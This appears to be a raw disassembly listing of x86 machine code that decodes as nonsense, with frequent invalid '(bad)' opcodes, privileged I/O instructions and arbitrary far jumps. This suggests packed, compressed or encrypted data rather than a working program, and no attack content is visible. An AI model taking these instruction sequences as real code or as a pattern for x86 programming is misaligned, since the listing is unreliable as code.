  424bea:	inc    ebx
  424beb:	fs xchg ebp,eax
  424bed:	push   ecx
  424bee:	push   esp
  424bef:	mov    dh,BYTE PTR [esi+0x9]
  424bf2:	adc    dh,0x34
  424bf5:	adc    eax,0x3b911405
  424bfa:	pop    ss
  424bfb:	retf   
  424bfc:	cmp    eax,0xb28df93f
  424c01:	add    BYTE PTR [edi],ch
  424c03:	xor    eax,0x1c7d7a9d
  424c08:	cmp    al,0x97
  424c0a:	imul   edx,DWORD PTR [edi-0x46a8385c],0xf1a665fe
  424c14:	jno    0x424c64
  424c16:	dec    ebp
  424c17:	mov    eax,0xefbd4c06
  424c1c:	inc    edi
  424c1d:	mov    bl,0xa3
  424c1f:	xchg   BYTE PTR [esi+ecx*1+0x5b],ah
  424c23:	loope  0x424c40
  424c25:	mov    dl,0x9
  424c27:	cs nop ebx
  424c2b:	sahf   
  424c2c:	mov    ch,0x2f
  424c2e:	cwde   
  424c2f:	jbe    0x424bd1
  424c31:	cwde   
  424c32:	mov    DWORD PTR [eax+edi*8-0x3b],esi
  424c36:	leave  
  424c37:	lahf   
  424c38:	jns    0x424c92
  424c3a:	sbb    eax,0x4f70c49d
  424c3f:	sub    eax,0xbf2029f5
  424c44:	pop    ecx
  424c45:	and    ch,BYTE PTR [edx]
  424c47:	cmp    ebx,edx
  424c49:	scas   eax,DWORD PTR es:[edi]
  424c4a:	cmp    DWORD PTR [edi-0x4e],ecx
  424c4d:	and    al,0x26
  424c4f:	mov    bl,0x5d
  424c51:	or     al,0x93
  424c53:	std    
  424c54:	nop
  424c55:	mov    ebp,0x38f163f0
  424c5a:	jl     0x424c3a
  424c5c:	mov    esp,0xb7fd0649
  424c61:	clc    
  424c62:	xchg   esi,eax
  424c63:	mov    ah,0xa0
  424c65:	int3   
  424c66:	test   eax,0x33cce4a1
  424c6b:	jnp    0x424c6d
  424c6d:	data16 fcom QWORD PTR [edx+0x3dd43694]
  424c74:	adc    DWORD PTR [edi-0x6],esp
  424c77:	pop    ss
  424c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c79:	mov    al,ds:0x9a6620ff
  424c7e:	pop    esi
  424c7f:	(bad)  
  424c80:	push   ss
  424c81:	adc    eax,0x7e122229
  424c86:	sbb    BYTE PTR [ecx],bl
  424c88:	adc    BYTE PTR [ecx-0x18],ah
  424c8b:	cld    
  424c8c:	sub    al,0x7d
  424c8e:	jae    0x424c61
  424c90:	push   ebx
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	or     eax,0x600543d3
  424d05:	mov    DWORD PTR [ecx],eax
  424d07:	add    BYTE PTR ds:0xee000001,al
  424d0d:	add    al,0x99
  424d0f:	inc    esi
  424d10:	inc    esi
  424d11:	mov    esp,0x70004e93
  424d16:	mov    dl,0x19
  424d18:	inc    edi
  424d19:	mov    eax,ds:0x808b5ca1
  424d1e:	pop    edi
  424d1f:	jecxz  0x424d75
  424d21:	dec    ecx
  424d22:	pop    ebp
  424d23:	inc    ebx
  424d24:	or     ebx,DWORD PTR [ebx+0x10]
  424d27:	outs   dx,BYTE PTR ds:[esi]
  424d28:	sbb    BYTE PTR [esp+edx*8-0x3],al
  424d2c:	push   ecx
  424d2d:	or     BYTE PTR [eax-0x610413d7],cl
  424d33:	adc    al,0xfe
  424d35:	push   ss
  424d36:	push   ds
  424d37:	xchg   esp,eax
  424d38:	add    al,0x49
  424d3a:	pop    ss
  424d3b:	pop    ebp
  424d3c:	jp     0x424d89
  424d3e:	sub    esi,DWORD PTR [ecx]
  424d40:	pop    ds
  424d41:	jg     0x424cea
  424d43:	jo     0x424d57
  424d45:	mov    eax,0xc1df199
  424d4a:	dec    eax
  424d4b:	jmp    0x49a0:0xbacd45a
  424d52:	xchg   edi,eax
  424d53:	jecxz  0x424d7d
  424d55:	xchg   ecx,eax
  424d56:	or     al,0xff
  424d58:	cmp    BYTE PTR [eax+eax*1+0x71],dl
  424d5c:	push   ebx
  424d5d:	xchg   edi,eax
  424d5e:	mov    esp,0xc9dc099d
  424d63:	push   edi
  424d64:	and    esp,ebp
  424d66:	addr16 popa 
  424d68:	imul   ecx,ebx
  424d6b:	dec    esp
  424d6c:	mov    dh,0x1c
  424d6e:	jb     0x424d30
  424d70:	aaa    
  424d71:	mov    al,ds:0xbaa2e8b3
  424d76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d77:	fadd   st,st(1)
  424d79:	mov    ch,0x6b
  424d7b:	cs pop ebx
  424d7d:	or     DWORD PTR [ecx-0x4734ae4d],eax
  424d83:	jnp    0x424db9
  424d85:	push   ds
  424d86:	xchg   ecx,eax
  424d87:	aam    0xf7
  424d89:	ret    0x25ae
  424d8c:	cmp    BYTE PTR [ecx],0x88
  424d8f:	cmp    DWORD PTR [esp+ebx*1-0x51],ecx
  424d93:	loopne 0x424e08
  424d95:	(bad)  
  424d96:	out    0xaf,al
  424d98:	mov    edi,0x65bbbd45
  424d9d:	dec    edi
  424d9e:	lahf   
  424d9f:	outs   dx,DWORD PTR ds:[esi]
  424da0:	jnp    0x424daf
  424da2:	push   edi
  424da3:	sub    al,0xf2
  424da5:	call   0xc361bc86
  424daa:	popf   
  424dab:	in     al,0x6f
  424dad:	or     eax,0x31599bce
  424db2:	mov    edx,0x550bdc90
  424db7:	xchg   ecx,eax
  424db8:	sub    cl,BYTE PTR [ebx]
  424dba:	push   edx
  424dbb:	pop    ds
  424dbc:	arpl   si,dx
  424dbe:	mov    es,WORD PTR [edi-0x301d7b26]
  424dc4:	aam    0x44
  424dc6:	gs test al,0x93
  424dc9:	mov    ds:0xe5c443ca,eax
  424dce:	cwde   
  424dcf:	jmp    0x424d68
  424dd1:	call   0xd6793cc3
  424dd6:	mov    edi,DWORD PTR [eax+0x8]
  424dd9:	(bad)  
  424dda:	cmp    ch,BYTE PTR [esi-0x79]
  424ddd:	sub    bl,bh
  424ddf:	jp     0x424da2
  424de1:	add    BYTE PTR [edx],cl
  424de3:	and    al,0xe2
  424de5:	scas   al,BYTE PTR es:[edi]
  424de6:	inc    edx
  424de7:	mov    al,ds:0x78413870
  424dec:	cmp    BYTE PTR [ebx+0xc],0x43
  424df0:	in     al,dx
  424df1:	mov    ebp,0x20e3be60
  424df6:	lea    eax,[esi-0x76]
  424df9:	pop    es
  424dfa:	push   edi
  424dfb:	push   esi
  424dfc:	dec    esi
  424dfd:	pop    ss
  424dfe:	fwait
  424dff:	pushf  
  424e00:	mov    ebx,0xded6a2f8
  424e05:	jp     0x424db2
  424e07:	sbb    DWORD PTR [ebx+0x5cd87df2],edi
  424e0d:	js     0x424e7c
  424e0f:	add    esp,DWORD PTR [ecx]
	...
  424e71:	add    BYTE PTR [eax],al
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424ed9
  424e81:	dec    ebx
  424e82:	(bad)  
  424e84:	mov    al,BYTE PTR gs:[ecx]
  424e87:	add    BYTE PTR ds:0xf8000001,al
  424e8d:	imul   esp
  424e8f:	nop
  424e90:	scas   eax,DWORD PTR es:[edi]
  424e91:	jae    0x424eb4
  424e93:	in     al,0x7e
  424e95:	(bad)  
  424e96:	jns    0x424e84
  424e98:	and    BYTE PTR fs:[ebx+0x6b4284b0],bl
  424e9f:	jecxz  0x424ebe
  424ea1:	push   esp
  424ea2:	mov    ds:0xa325bee2,eax
  424ea7:	sbb    bl,BYTE PTR [ebx+0x73a69a7c]
  424ead:	cwde   
  424eae:	mov    DWORD PTR [edx-0x6],edi
  424eb1:	je     0x424ed0
  424eb3:	xchg   edi,eax
  424eb4:	ror    BYTE PTR [esi+0x4aa9c8cf],1
  424eba:	pop    ebp
  424ebb:	add    eax,DWORD PTR [esi-0x4a]
  424ebe:	lahf   
  424ebf:	cmp    eax,0x8953237d
  424ec4:	xchg   esi,eax
  424ec5:	stos   BYTE PTR es:[edi],al
  424ec6:	lods   eax,DWORD PTR ds:[esi]
  424ec7:	add    DWORD PTR [edx-0x8],edi
  424eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ecb:	test   DWORD PTR [esi+0x55],eax
  424ece:	push   es
  424ecf:	lock lods eax,DWORD PTR ds:[esi]
  424ed1:	ret    0x342
  424ed4:	ds call 0x7ad7:0xc7b4ae04
  424edc:	fld    QWORD PTR [ecx+0x2e]
  424edf:	das    
  424ee0:	push   esi
  424ee1:	jp     0x424eb2
  424ee3:	int3   
  424ee4:	mov    bl,0xd4
  424ee6:	lds    ebp,FWORD PTR [edx+esi*1+0xd54841b]
  424eed:	inc    ecx
  424eee:	pop    eax
  424eef:	imul   DWORD PTR [ecx]
  424ef1:	jbe    0x424e7c
  424ef3:	es add eax,0xa97f175d
  424ef9:	add    DWORD PTR [ecx-0x78],ebp
  424efc:	in     eax,dx
  424efd:	sbb    eax,0x4c78eff1
  424f02:	(bad)  
  424f03:	in     eax,dx
  424f04:	mov    ds:0x8d57ac33,al
  424f09:	push   cs
  424f0a:	and    edx,DWORD PTR ds:0xe0242e9b
  424f10:	not    BYTE PTR [eax]
  424f12:	ret    
  424f13:	aas    
  424f14:	popa   
  424f15:	mov    ah,0x43
  424f17:	cmp    ah,BYTE PTR [eax+0x7f]
  424f1a:	push   cs
  424f1b:	cli    
  424f1c:	mov    cl,0x8e
  424f1e:	mov    ?,WORD PTR [ebx-0x307dbff]
  424f24:	cld    
  424f25:	loope  0x424f1f
  424f27:	push   ebx
  424f28:	jecxz  0x424f99
  424f2a:	pop    ss
  424f2b:	push   ds
  424f2c:	jo     0x424f97
  424f2e:	or     ebx,ebp
  424f30:	add    ch,ch
  424f32:	shl    DWORD PTR [eax+0x6d],cl
  424f35:	shr    BYTE PTR [ebx],0xb3
  424f38:	int3   
  424f39:	fld    TBYTE PTR [ecx+0x7b]
  424f3c:	daa    
  424f3d:	dec    ebx
  424f3e:	xlat   BYTE PTR ds:[ebx]
  424f3f:	dec    ecx
  424f40:	mov    dh,0xa4
  424f42:	into   
  424f43:	sbb    BYTE PTR [esi+eiz*1+0x40cfc4b0],cl
  424f4a:	stos   DWORD PTR es:[edi],eax
  424f4b:	inc    eax
  424f4c:	ret    
  424f4d:	sub    DWORD PTR [ecx],edi
  424f4f:	je     0x424f94
  424f51:	jno    0x424f7d
  424f53:	add    edx,DWORD PTR [edx-0x42]
  424f56:	imul   ebp,DWORD PTR [esi],0x32
  424f59:	xor    eax,0x2bf3c8f4
  424f5e:	(bad)  
  424f5f:	xchg   ebp,eax
  424f60:	repnz fwait
  424f62:	adc    eax,DWORD PTR gs:[eax+esi*2+0x28057af9]
  424f6a:	shl    BYTE PTR [eax-0x40dd761f],1
  424f70:	mov    al,ds:0x148094c9
  424f75:	cmp    eax,0x812372fc
  424f7a:	(bad)  
  424f7b:	mov    ebp,0x7e0ff06c
  424f80:	mov    ds,edi
  424f82:	add    ah,BYTE PTR [esi+esi*8]
  424f85:	(bad)  [esi-0x7fd81934]
  424f8b:	std    
  424f8c:	mov    eax,0xda7a5761
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	stos   DWORD PTR es:[edi],eax
  425001:	push   0xffffff84
  425003:	ds push 0xffffff8b
  425006:	add    DWORD PTR [eax],eax
  425008:	add    eax,0xb4000001
  42500d:	rcl    eax,0x47
  425010:	imul   BYTE PTR [ebx+eax*4]
  425013:	adc    ebp,DWORD PTR [ecx]
  425015:	jecxz  0x425009
  425017:	clc    
  425018:	cs jno 0x425027
  42501b:	inc    edx
  42501c:	(bad)  
  42501d:	xchg   ecx,eax
  42501e:	xchg   ebp,eax
  42501f:	mov    eax,gs
  425021:	fsubr  DWORD PTR [eax]
  425023:	int3   
  425024:	add    BYTE PTR [eax+ecx*8+0x3f],0x4
  425029:	sar    DWORD PTR [eax+0x1b],0xbe
  42502d:	pop    ebp
  42502e:	shl    DWORD PTR ds:[edx+0x31],0x0
  425033:	out    0x6d,al
  425035:	xlat   BYTE PTR ds:[ebx]
  425036:	aad    0xd1
  425038:	and    BYTE PTR [ecx-0x11],dh
  42503b:	mov    ds:0xf59e938b,al
  425040:	lea    eax,ss:[ebx]
  425043:	aaa    
  425044:	add    edi,ebp
  425046:	mov    al,0xc3
  425048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425049:	push   edi
  42504a:	push   di
  42504c:	mov    ebp,0xb786fcf5
  425051:	(bad)  
  425052:	in     eax,dx
  425053:	(bad)  
  425054:	pushf  
  425055:	clc    
  425056:	mov    BYTE PTR [esi+0x3b],bl
  425059:	scas   al,BYTE PTR es:[edi]
  42505a:	sbb    DWORD PTR [eax+0xf373e2d],ebx
  425060:	sub    eax,0x9f3c9cc8
  425065:	mov    ebp,0xdf37dbe4
  42506a:	mov    eax,0x33c0c76c
  42506f:	ss mov ch,0x46
  425072:	dec    esi
  425073:	not    BYTE PTR [esi]
  425075:	mov    al,0x3b
  425077:	cwde   
  425078:	cmp    DWORD PTR [esi+0x66691915],esi
  42507e:	mov    ah,cl
  425080:	cmp    esp,DWORD PTR [ecx]
  425082:	dec    edx
  425083:	stc    
  425084:	jb     0x425092
  425086:	or     DWORD PTR [ebp+0x19641bbc],esp
  42508c:	aaa    
  42508d:	push   esi
  42508e:	fdiv   QWORD PTR [eax]
  425090:	jae    0x42506e
  425092:	mov    esp,0x103a1c0a
  425097:	push   ds
  425098:	pop    esp
  425099:	or     BYTE PTR [esi+0x71973c02],bl
  42509f:	push   ss
  4250a0:	jns    0x42506f
  4250a2:	test   al,0xd7
  4250a4:	mov    ds:0x16336f65,eax
  4250a9:	mov    ah,0x52
  4250ab:	push   0x8a13c911
  4250b0:	jp     0x425079
  4250b2:	mov    al,bl
  4250b4:	mov    WORD PTR [edi-0x33],ds
  4250b7:	push   ebx
  4250b8:	(bad)  
  4250b9:	popa   
  4250ba:	gs dec ebx
  4250bc:	nop
  4250bd:	xor    DWORD PTR [esi],0xffffff9e
  4250c0:	les    edx,FWORD PTR [ebp+0x18]
  4250c3:	hlt    
  4250c4:	mov    DWORD PTR [ecx-0x38],esp
  4250c7:	add    ah,BYTE PTR cs:[eax+0x43]
  4250cb:	loop   0x425069
  4250cd:	ret    0x6631
  4250d0:	mov    bh,BYTE PTR [esi-0x4a144f3d]
  4250d6:	(bad)  
  4250d7:	popf   
  4250d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250d9:	shr    DWORD PTR [eax-0x23],0x2d
  4250dd:	std    
  4250de:	mov    edi,0x609f0f70
  4250e3:	xchg   edx,eax
  4250e4:	fiadd  WORD PTR [ecx-0x487819c0]
  4250ea:	add    eax,DWORD PTR [edx]
  4250ec:	mul    ch
  4250ee:	or     DWORD PTR [esi+0x78],edx
  4250f1:	and    eax,esi
  4250f3:	mov    esi,0x66a7ab25
  4250f8:	mov    ecx,0x7f944790
  4250fd:	pop    ds
  4250fe:	or     al,0xdc
  425100:	in     al,dx
  425101:	cmp    DWORD PTR [eax-0x71],esp
  425104:	leave  
  425105:	ja     0x4250bf
  425107:	sbb    DWORD PTR [esi-0x65],ecx
  42510a:	gs pop esp
  42510c:	and    esp,DWORD PTR [ebx+0x2c66cb]
	...
  425172:	add    BYTE PTR [eax],al
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x1d43:0x4ee792e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0xd2000001,al
  42518d:	scas   eax,DWORD PTR es:[edi]
  42518e:	je     0x42518e
  425190:	pop    ds
  425191:	and    DWORD PTR [eax],edx
  425193:	fldenv [ebp+0x46724f47]
  425199:	(bad)  
  42519a:	mov    al,ds:0x780a8b56
  42519f:	push   esp
  4251a0:	jle    0x42512e
  4251a2:	aam    0xfd
  4251a4:	mov    dl,0x2b
  4251a6:	jns    0x425210
  4251a8:	adc    al,0x90
  4251aa:	(bad)  
  4251ab:	cmp    ecx,DWORD PTR [ebx-0x1]
  4251ae:	lods   eax,DWORD PTR ds:[esi]
  4251b0:	cwde   
  4251b1:	adc    eax,0x97fbb3eb
  4251b6:	sbb    DWORD PTR [edx-0x56],esi
  4251b9:	test   eax,0xcc3bf745
  4251be:	in     al,dx
  4251bf:	call   0xa8f86094
  4251c4:	push   esi
  4251c5:	pop    ds
  4251c6:	cmp    ebx,ebx
  4251c8:	jnp    0x4251ab
  4251ca:	dec    edx
  4251cb:	jae    0x4251ce
  4251cd:	retf   
  4251ce:	mov    ah,cl
  4251d0:	mul    DWORD PTR [edx]
  4251d2:	popf   
  4251d3:	lods   eax,DWORD PTR ds:[esi]
  4251d4:	int3   
  4251d5:	call   0xee19d8ed
  4251da:	and    al,0xa3
  4251dc:	xor    al,0x78
  4251de:	pop    ebp
  4251df:	dec    ebp
  4251e0:	int    0xe9
  4251e2:	xchg   esi,eax
  4251e3:	or     eax,0xf088c805
  4251e8:	lods   al,BYTE PTR ds:[esi]
  4251e9:	ss jl  0x4251c4
  4251ec:	mov    ds:0x26d8c9f6,eax
  4251f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251f2:	xchg   ebp,eax
  4251f3:	leave  
  4251f4:	fdivr  st,st(3)
  4251f6:	and    esi,DWORD PTR [ebp+0x79]
  4251f9:	retf   
  4251fa:	mov    WORD PTR [ebp-0x434e0643],ss
  425200:	xchg   ecx,eax
  425201:	arpl   WORD PTR [ebp-0x46],cx
  425204:	jno    0x4251be
  425206:	cmc    
  425207:	mov    bl,0x95
  42520a:	cdq    
  42520b:	(bad)
  425210:	and    al,0x21
  425212:	push   ebx
  425213:	mov    DWORD PTR [ecx-0x649571ea],ebp
  425219:	and    cl,BYTE PTR [edi]
  42521b:	nop
  42521c:	xchg   ecx,eax
  42521d:	pop    esp
  42521e:	push   ecx
  42521f:	mov    ds:0xaec7446d,al
  425224:	pop    esi
  425225:	das    
  425226:	or     esp,edx
  425228:	jg     0x42528a
  42522a:	jnp    0x4251fe
  42522c:	mov    eax,ds:0xbdc488cd
  425231:	repnz sbb al,0x49
  425234:	out    0x3b,eax
  425236:	loope  0x42521b
  425238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425239:	ins    DWORD PTR es:[edi],dx
  42523a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42523b:	test   BYTE PTR [esi],0x9b
  42523e:	adc    esi,DWORD PTR [edi-0x231c3371]
  425244:	lahf   
  425245:	nop
  425246:	test   BYTE PTR [edi-0x57],dh
  425249:	adc    DWORD PTR [esi-0x1c71ea19],edx
  42524f:	or     eax,0x9c7da158
  425254:	setbe  bh
  425257:	mov    al,ds:0x3db01d14
  42525c:	mov    ah,0x54
  42525e:	xchg   BYTE PTR [edi-0x55],cl
  425261:	jbe    0x4251e8
  425263:	hlt    
  425264:	bound  ebp,QWORD PTR [eax-0x3b]
  425267:	dec    esp
  425268:	test   eax,0x72b0637f
  42526d:	add    DWORD PTR [ebx+0x793d03a6],esp
  425273:	xchg   DWORD PTR [ebx+0x7747932b],edx
  425279:	or     DWORD PTR [edx],0xffffffc0
  42527c:	adc    eax,0x72c62030
  425281:	mov    ch,0xd7
  425283:	xchg   eax,esp
  425285:	int    0xb7
  425287:	and    bh,ch
  425289:	add    DWORD PTR [esi+0x18c2b41c],edi
  42528f:	mov    ecx,0x99
	...
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	inc    esi
  425301:	and    esi,DWORD PTR [esi+0x18d74d4]
  425307:	add    BYTE PTR ds:0xfc000001,al
  42530d:	xor    al,0x32
  42530f:	add    BYTE PTR [edi+0x2a1fe268],0x2f
  425316:	fisubr DWORD PTR [eax+0x4d16c79]
  42531c:	(bad)  
  42531d:	fst    QWORD PTR [esi+0x53254bb2]
  425323:	and    al,ah
  425325:	or     eax,DWORD PTR [edx+ecx*2]
  425328:	jnp    0x425387
  42532a:	imul   ecx,DWORD PTR [eax+0x4d210b17],0x52
  425331:	shl    DWORD PTR [esp+ebx*1-0x74bb164d],0x54
  425339:	dec    esi
  42533a:	es out 0xcb,eax
  42533d:	out    0x19,eax
  42533f:	push   edx
  425340:	imul   edx,DWORD PTR [esi-0x7e0175d8],0x7f898ee1
  42534a:	mov    DWORD PTR [ebx],esp
  42534c:	pop    eax
  42534d:	call   0xe6e:0x342b5d3
  425354:	mov    ch,0x14
  425356:	and    eax,0xe8f415a6
  42535b:	and    BYTE PTR [edx],bl
  42535d:	sbb    al,0xa5
  42535f:	pusha  
  425360:	repnz mov ah,0xf2
  425363:	scas   al,BYTE PTR es:[edi]
  425364:	inc    ecx
  425365:	lods   al,BYTE PTR ds:[esi]
  425366:	and    eax,0xcfb85a11
  42536b:	int3   
  42536c:	mov    ecx,0xe6a4c660
  425371:	sbb    DWORD PTR [edx+ebp*8+0x115c1986],edx
  425378:	push   ebp
  425379:	jge    0x42530b
  42537b:	int    0x3f
  42537d:	cmp    edx,DWORD PTR [eax-0x74233537]
  425383:	aam    0x29
  425385:	jno    0x42537f
  425387:	dec    edi
  425388:	cmc    
  425389:	loop   0x425405
  42538b:	sbb    BYTE PTR [eax+edx*8+0x15],cl
  42538f:	sahf   
  425390:	out    0x51,al
  425392:	and    esi,ebx
  425394:	pop    edx
  425395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425396:	int    0xc3
  425398:	rol    DWORD PTR [ebx],1
  42539a:	repz daa 
  42539c:	outs   dx,DWORD PTR ds:[esi]
  42539d:	ins    BYTE PTR es:[edi],dx
  42539e:	sti    
  42539f:	fwait
  4253a0:	xchg   ebp,eax
  4253a1:	or     DWORD PTR [esi+0x1e686bbc],0xd44be0a8
  4253ab:	mov    ecx,0x469527fe
  4253b0:	mov    bh,0x65
  4253b2:	mov    edi,0xa515c20e
  4253b7:	mov    ecx,0x9f1b311c
  4253bc:	mov    ds:0x9eced970,eax
  4253c1:	inc    edi
  4253c2:	(bad)  
  4253c3:	sahf   
  4253c4:	retf   
  4253c5:	jge    0x42541a
  4253c7:	hlt    
  4253c8:	mov    ebx,DWORD PTR [esp+ebx*4]
  4253cb:	rcl    BYTE PTR [eax+0x31],cl
  4253ce:	and    al,0x31
  4253d0:	adc    ebx,esp
  4253d2:	rcl    al,1
  4253d4:	std    
  4253d5:	and    cl,BYTE PTR [ebx-0x5a]
  4253d8:	mov    eax,0x42a022c
  4253dd:	mov    dl,BYTE PTR [ebp-0x262cbb80]
  4253e3:	in     al,0x29
  4253e5:	imul   edi,DWORD PTR [ecx+0x5c],0xffffffa9
  4253e9:	jecxz  0x425432
  4253eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253ec:	adc    DWORD PTR [edx],esp
  4253ee:	je     0x425458
  4253f0:	imul   esi,DWORD PTR [ecx-0x824073],0x1f835c6f
  4253fa:	jl     0x425477
  4253fc:	push   es
  4253fd:	stos   DWORD PTR es:[edi],eax
  4253fe:	dec    esi
  4253ff:	mov    ch,0xec
  425401:	cmp    eax,DWORD PTR [edi+0x7572b8ab]
  425407:	pop    ds
  425408:	out    dx,eax
  425409:	lock jns 0x425444
  42540c:	dec    ebp
  42540d:	(bad)  
  42540e:	aas    
  42540f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425410:	repnz add BYTE PTR [eax],al
	...
  425473:	add    BYTE PTR [edx+0x9],al
  425476:	les    ebp,FWORD PTR [ecx-0x14901231]
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebp,DWORD PTR [ebp+0x79eeea48]
  425485:	mov    es,WORD PTR [ecx]
  425487:	add    BYTE PTR ds:0x75000001,al
  42548d:	mov    bl,0xe3
  42548f:	push   ss
  425490:	jmp    0x8465:0x5468fc80
  425497:	fwait
  425498:	hlt    
  425499:	mov    ss,ecx
  42549b:	sar    BYTE PTR [esi-0x47a441c6],cl
  4254a1:	outs   dx,BYTE PTR ds:[esi]
  4254a2:	sbb    DWORD PTR [esp+ebx*8-0x45],esp
  4254a6:	shrd   DWORD PTR [edi-0xd],ecx,0x78
  4254ab:	push   ebp
  4254ac:	xor    eax,DWORD PTR [edi]
  4254ae:	and    ebx,DWORD PTR [ecx-0x10]
  4254b1:	sbb    ecx,DWORD PTR [eax+0x572b8265]
  4254b7:	dec    edx
  4254b8:	shl    ebp,1
  4254ba:	cmc    
  4254bb:	xchg   esp,eax
  4254bc:	push   eax
  4254bd:	out    dx,al
  4254be:	in     al,0x6f
  4254c0:	fcmovnb st,st(3)
  4254c2:	ja     0x42545f
  4254c4:	dec    esi
  4254c5:	mov    ch,0x42
  4254c7:	xchg   esi,eax
  4254c8:	dec    eax
  4254c9:	div    BYTE PTR [edi]
  4254cb:	xor    ebx,DWORD PTR [edi]
  4254cd:	push   es
  4254ce:	and    ah,dl
  4254d0:	sbb    BYTE PTR [eax+0x38],bh
  4254d3:	mov    edx,0x7687bb33
  4254d8:	pop    ss
  4254d9:	and    eax,0x61a36bc6
  4254de:	mov    dl,0x71
  4254e0:	mov    ebp,0xdc297dbb
  4254e5:	push   edx
  4254e6:	lods   al,BYTE PTR ds:[esi]
  4254e7:	jmp    0x42548b
  4254e9:	addr16 pop edx
  4254eb:	or     eax,0x5aaabbfa
  4254f0:	mov    al,0xfd
  4254f2:	out    0xd1,eax
  4254f4:	sbb    al,0xbd
  4254f6:	aad    0xc4
  4254f8:	add    eax,0x69f4b14d
  4254fd:	fucom  st(1)
  4254ff:	test   al,0xd0
  425501:	and    BYTE PTR [ebx+0x23c61a93],cl
  425507:	aad    0xef
  425509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42550a:	(bad)  
  42550b:	fstp   QWORD PTR [edi-0xff4ff16]
  425511:	mov    edx,DWORD PTR [eax+ebp*8]
  425514:	scas   al,BYTE PTR es:[edi]
  425515:	sub    DWORD PTR [edx+0x455bbd39],esi
  42551b:	enter  0x2cb2,0x91
  42551f:	adc    eax,edi
  425521:	mov    esp,0x861572be
  425526:	sub    DWORD PTR [edx],edx
  425528:	fs into 
  42552a:	outs   dx,BYTE PTR ds:[esi]
  42552b:	(bad)  
  42552d:	push   ds
  42552e:	pop    edx
  42552f:	and    eax,0x6b9e107b
  425534:	cmp    DWORD PTR [edx+0x17],ebp
  425537:	sub    dh,BYTE PTR [ebp-0x6a]
  42553a:	aad    0x95
  42553c:	js     0x4254c6
  42553e:	add    eax,DWORD PTR [edx+edi*1+0x6e2ceea3]
  425545:	xchg   ecx,eax
  425546:	push   ebx
  425547:	cmp    DWORD PTR [edx-0x26772132],edx
  42554d:	mov    bh,BYTE PTR [ecx+0x7f236b34]
  425553:	add    al,BYTE PTR [edi+0x4ebfec8c]
  425559:	or     ebp,DWORD PTR [edi]
  42555b:	pop    es
  42555c:	rol    dh,cl
  42555e:	push   eax
  42555f:	test   BYTE PTR [esp+edi*2],dl
  425562:	adc    BYTE PTR [edi+0x2348a58c],ah
  425568:	js     0x42550b
  42556a:	mov    DWORD PTR [edx+0x1db3a48c],esp
  425570:	mov    esp,DWORD PTR [edx+0x313fef47]
  425576:	or     eax,0xd383f5bf
  42557b:	push   esp
  42557c:	test   eax,0x3eeaf782
  425581:	xchg   BYTE PTR [esi+0x5ff244a3],cl
  425587:	dec    ebp
  425588:	xor    DWORD PTR [esp+eiz*8-0x5c],ecx
  42558c:	sbb    al,0xf8
  42558e:	and    BYTE PTR [eax+0x14],dh
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xb5eef13a
  425602:	cdq    
  425603:	icebp  
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0x3f000001
  42560d:	adc    bl,BYTE PTR [ebp+0x7bc8d305]
  425613:	mov    ecx,0xd8ca5ae
  425618:	std    
  425619:	sbb    eax,0x36540e5
  42561e:	or     BYTE PTR ds:0x164ca0d3,al
  425624:	jp     0x42563c
  425626:	sub    dh,BYTE PTR [edx]
  425628:	mov    eax,ds:0xc68c22e
  42562d:	inc    eax
  42562e:	mov    cl,0x3c
  425630:	jge    0x4256a8
  425632:	inc    ebp
  425633:	mov    al,ds:0x96734168
  425638:	iret   
  425639:	ins    DWORD PTR es:[edi],dx
  42563a:	push   ebp
  42563b:	enter  0xd79b,0xc6
  42563f:	enter  0x7e54,0x5c
  425643:	mov    ecx,0x2ab25a06
  425648:	ror    BYTE PTR [ebx-0x1c],cl
  42564b:	je     0x425664
  42564d:	and    eax,0xf2305fb4
  425652:	inc    ecx
  425653:	les    esi,FWORD PTR [esi-0x2e836b6e]
  425659:	mov    bl,0x89
  42565b:	je     0x42563c
  42565d:	test   al,0x27
  42565f:	sti    
  425660:	adc    dh,BYTE PTR [ebp+0x20]
  425663:	adc    eax,0x6baf73ae
  425668:	inc    edi
  425669:	stc    
